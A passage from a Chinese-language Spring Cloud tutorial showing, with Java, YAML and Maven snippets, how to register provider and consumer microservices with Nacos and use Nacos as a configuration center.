<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>standard<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">SpringContextUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>discovery<span class="token punctuation">.</span></span><span class="token class-name">EnableDiscoveryClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableApplicationContext</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>env<span class="token punctuation">.</span></span><span class="token class-name">Environment</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">springfox<span class="token punctuation">.</span>documentation<span class="token punctuation">.</span>swagger2<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">EnableSwagger2</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@EnableSwagger2</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token annotation punctuation">@EnableDiscoveryClient</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServiceProviderApplication</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">ConfigurableApplicationContext</span> applicationContext <span class="token operator">=</span>   <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ServiceProviderApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Environment</span> env <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> port <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> path <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.servlet.context-path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n--------------------------------------\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"Application is running! Access URLs:\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"Local: \t\thttp://localhost:"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path<span class="token operator">+</span> <span class="token string">"/index.html\n\t"</span> <span class="token operator">+</span>
               <span class="token string">"swagger-ui: \thttp://localhost:"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/swagger-ui.html\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="step3_Rest__2129"></a>step3：服务提供者的 Rest 服务接口</h6> 
<p>service-provider-demo 提供 一个非常简单的 Rest 服务接口以供访问</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/echo"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EchoController</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">//回显服务</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/{string}"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> string<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"echo: "</span> <span class="token operator">+</span> string<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="step4_2154"></a>step4：配置文件</h6> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> service<span class="token punctuation">-</span>provider<span class="token punctuation">-</span>demo
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">18080</span>
</code></pre> 
<h6><a id="step5swagger_UI_2170"></a>step5：启动之后，通过swagger UI访问：</h6> 
<p><img src="https://images2.imgbox.com/91/b8/wiEFB5tl_o.png" alt=""></p> 
<h5><a id="54_Consumer_RPC_2178"></a>5.4 Consumer 微服务演示RPC远程调用</h5> 
<p>在 NacosConsumerApplication 中集成 RestTemplate 和 Ribbon</p> 
<pre><code class="prism language-java"><span class="token annotation punctuation">@LoadBalanced</span>
<span class="token annotation punctuation">@Bean</span>
<span class="token keyword">public</span> <span class="token class-name">RestTemplate</span> <span class="token function">restTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="controller__2190"></a>消费者的controller 类</h6> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">EchoClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Api</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/echo"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"服务- 消费者"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EchoConsumerController</span> <span class="token punctuation">{<!-- --></span>


    <span class="token comment">//注入 @FeignClient 注解配置 所配置的 EchoClient 客户端Feign实例</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token class-name">EchoClient</span> echoClient<span class="token punctuation">;</span>


    <span class="token comment">//回显服务</span>
    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"消费回显服务接口"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/{string}"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>GET<span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echoRemoteEcho</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> string<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"provider echo is:"</span> <span class="token operator">+</span> echoClient<span class="token punctuation">.</span><span class="token function">echo</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_2227"></a>消费者配置文件</h6> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> sevice<span class="token punctuation">-</span>consumer<span class="token punctuation">-</span>demo
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span>
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">18081</span>
</code></pre> 
<h6><a id="swagger_UI_2243"></a>通过swagger UI访问消费者：</h6> 
<p><img src="https://images2.imgbox.com/b9/ad/Q4D3YQfT_o.png" alt=""></p> 
<p>访问远程的echo API：</p> 
<p><img src="https://images2.imgbox.com/6f/e1/FBOHHm6o_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/ef/82/joh1PZcO_o.png" alt=""></p> 
<h5><a id="55_2259"></a>5.5涉及到的演示地址：</h5> 
<p>服务提供者 service-provider-demo：</p> 
<p><a href="http://localhost:18080/provider/swagger-ui.html#/Echo_%E6%BC%94%E7%A4%BA" rel="nofollow">http://localhost:18080/provider/swagger-ui.html#/Echo_演示</a></p> 
<p>服务消费者：</p> 
<p>[http://localhost:18081/consumer/swagger-ui.html#/服务- 消费者/echoRemoteEchoUsingGET](http://localhost:18081/consumer/swagger-ui.html#/服务- 消费者/echoRemoteEchoUsingGET)</p> 
<p>注册中心Nacos：</p> 
<p>http://cdh1:8848/nacos/index.html#/serviceManagement?dataId=&amp;group=&amp;appName=&amp;namespace=</p> 
<h5><a id="56_Nacos_Console_2279"></a>5.6 Nacos Console</h5> 
<p>这时候查看 Nacos Console 也能看到已注册的服务列表及其详情</p> 
<p><img src="https://images2.imgbox.com/2a/1d/LvPEtbf2_o.png" alt=""></p> 
<h4><a id="62Nacos_2289"></a>6、实战2：使用Nacos作为配置中心</h4> 
<h5><a id="61__2291"></a>6.1 基本概念</h5> 
<h6><a id="1Profile_2293"></a>1）Profile</h6> 
<p>Java项目一般都会有多个Profile配置，用于区分开发环境，测试环境，准生产环境，生成环境等，每个环境对应一个properties文件（或是yml/yaml文件），然后通过设置 spring.profiles.active 的值来决定使用哪个配置文件。</p> 
<p>例子：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> sharding<span class="token punctuation">-</span>jdbc<span class="token punctuation">-</span>provider
  <span class="token key atrule">jpa</span><span class="token punctuation">:</span>
    <span class="token key atrule">hibernate</span><span class="token punctuation">:</span>
      <span class="token key atrule">ddl-auto</span><span class="token punctuation">:</span> none
      <span class="token key atrule">dialect</span><span class="token punctuation">:</span> org.hibernate.dialect.MySQL5InnoDBDialect
      <span class="token key atrule">show-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>
     <span class="token key atrule">active</span><span class="token punctuation">:</span> sharding<span class="token punctuation">-</span>db<span class="token punctuation">-</span>table    <span class="token comment"># 分库分表配置文件</span>
    <span class="token comment">#active: atomiclong-id    # 自定义主键的配置文件</span>
    <span class="token comment">#active: replica-query    # 读写分离配置文件</span>
</code></pre> 
<p>Nacos Config的作用就把这些文件的内容都移到一个统一的配置中心，即方便维护又支持实时修改后动态刷新应用。</p> 
<h6><a id="2Data_ID_2320"></a>2）Data ID</h6> 
<p>当使用Nacos Config后，Profile的配置就存储到Data ID下，即一个Profile对应一个Data ID</p> 
<p>Data ID的拼接格式：${prefix} - ${spring.profiles.active} . ${file-extension}</p> 
<ul><li> <p>prefix 默认为 spring.application.name 的值，也可以通过配置项 spring.cloud.nacos.config.prefix 来配置</p> </li><li> <p>spring.profiles.active 取 spring.profiles.active 的值，即为当前环境对应的 profile</p> </li><li> <p>file-extension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置</p> </li></ul> 
<h6><a id="3Group_2334"></a>3）Group</h6> 
<p>Group 默认为 DEFAULT_GROUP，可以通过 spring.cloud.nacos.config.group 来配置，当配置项太多或者有重名时，可以通过分组来方便管理</p> 
<p>最后就和原来使用springcloud一样通过@RefreshScope 和@Value注解即可</p> 
<h5><a id="62_Nacosconsole__2342"></a>6.2 通过Nacos的console 去增加配置</h5> 
<p>这回首先要在nacos中配置相关的配置，打开Nacos配置界面，依次创建2个Data ID</p> 
<ul><li>nacos-config-demo-dev.yaml 开发环境的配置</li><li>nacos-config-demo-test.yaml 测试环境的配置</li></ul> 
<h6><a id="1nacosconfigdemodevyaml_2349"></a>1）nacos-config-demo-dev.yaml</h6> 
<p>内容如下图：</p> 
<p><img src="https://images2.imgbox.com/bd/24/JxhMQDsq_o.png" alt=""></p> 
<h6><a id="2nacosconfigdemosityaml_2357"></a>2）nacos-config-demo-sit.yaml</h6> 
<blockquote> 
 <p>内容如下图：</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/c0/38/QIKE7n5x_o.png" alt=""></p> 
<h5><a id="63_Nacos__Config_Client_2365"></a>6.3 使用Nacos Config Client组件</h5> 
<p>问题2：微服务Provider实例上，如何使用Nacos Config Client组件的有哪些步骤？</p> 
<h6><a id="1nacos_config__2373"></a>1）加载nacos config 的客户端依赖：</h6> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${nacos.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h6><a id="_2383"></a>启动类</h6> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>starter</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span></span><span class="token class-name">RedisAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span></span><span class="token class-name">RedisRepositoriesAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">DataSourceAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">DataSourceTransactionManagerAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>jpa<span class="token punctuation">.</span></span><span class="token class-name">HibernateJpaAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>security<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">SecurityAutoConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>client<span class="token punctuation">.</span>discovery<span class="token punctuation">.</span></span><span class="token class-name">EnableDiscoveryClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>openfeign<span class="token punctuation">.</span></span><span class="token class-name">EnableFeignClients</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ConfigurableApplicationContext</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>env<span class="token punctuation">.</span></span><span class="token class-name">Environment</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">springfox<span class="token punctuation">.</span>documentation<span class="token punctuation">.</span>swagger2<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">EnableSwagger2</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@EnableSwagger2</span>
<span class="token annotation punctuation">@EnableDiscoveryClient</span>
<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@SpringBootApplication</span><span class="token punctuation">(</span>
        scanBasePackages <span class="token operator">=</span>
                <span class="token punctuation">{<!-- --></span>
                        <span class="token string">"com.crazymaker.cloud.nacos.demo"</span><span class="token punctuation">,</span>
                        <span class="token string">"com.crazymaker.springcloud.standard"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
        exclude <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token class-name">SecurityAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token comment">//排除db的自动配置</span>
                <span class="token class-name">DataSourceAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">DataSourceTransactionManagerAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">HibernateJpaAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token comment">//排除redis的自动配置</span>
                <span class="token class-name">RedisAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>
                <span class="token class-name">RedisRepositoriesAutoConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">//启动Feign</span>
<span class="token annotation punctuation">@EnableFeignClients</span><span class="token punctuation">(</span>basePackages <span class="token operator">=</span>
        <span class="token punctuation">{<!-- --></span><span class="token string">"com.crazymaker.cloud.nacos.demo.consumer.client"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigDomeProviderApplication</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">ConfigurableApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{<!-- --></span>
            applicationContext <span class="token operator">=</span> <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ConfigDomeProviderApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Server startup done."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"服务启动报错"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Environment</span> env <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> port <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.port"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> path <span class="token operator">=</span> env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"server.servlet.context-path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"\n----------------------------------------------------------\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"Application is running! Access URLs:\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"Local: \t\thttp://localhost:"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/index.html\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"swagger-ui: \thttp://localhost:"</span> <span class="token operator">+</span> port <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/swagger-ui.html\n\t"</span> <span class="token operator">+</span>
                <span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_2453"></a>控制类：</h6> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>cloud<span class="token punctuation">.</span>nacos<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Api</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span><span class="token punctuation">;</span>
